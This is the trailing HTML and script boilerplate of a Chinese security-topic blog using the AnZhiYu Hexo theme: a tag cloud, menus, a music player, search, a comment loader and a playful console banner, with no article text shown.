href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>